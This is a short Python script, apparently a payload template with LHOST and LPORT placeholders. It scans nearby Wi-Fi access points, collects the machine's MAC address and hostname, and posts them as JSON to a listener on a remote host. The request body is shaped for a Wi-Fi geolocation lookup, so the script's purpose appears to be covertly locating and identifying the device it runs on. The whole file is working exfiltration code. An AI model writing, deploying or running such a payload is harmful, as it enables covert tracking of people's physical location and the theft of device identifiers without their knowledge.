#!/usr/bin/python3

#The script uses the first wifi interface it finds, but sometimes other
#other interfaces have to be used
import json
import requests
import pywifi
import platform
from getmac import get_mac_address

LHOST = "{{LHOST}}"
LPORT = {{LPORT}}
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

iface.scan()
scan_results = iface.scan_results()

mac_address = get_mac_address()
device_name = platform.node()

user_info = {
    "mac": mac_address,
    "device": device_name,
    "wifi_data": {
        "considerIp": "false",
        "wifiAccessPoints": []
    }
}

for result in scan_results:
    wifi_access_point = {
        "macAddress": result.bssid,
        "signalStrength": result.signal,
        "signalToNoiseRatio": 0  
    }
    user_info["wifi_data"]["wifiAccessPoints"].append(wifi_access_point)

response = requests.post(f"http://{LHOST}:{LPORT}/listener", headers = {'Content-Type': 'application/json'}, data=json.dumps(user_info))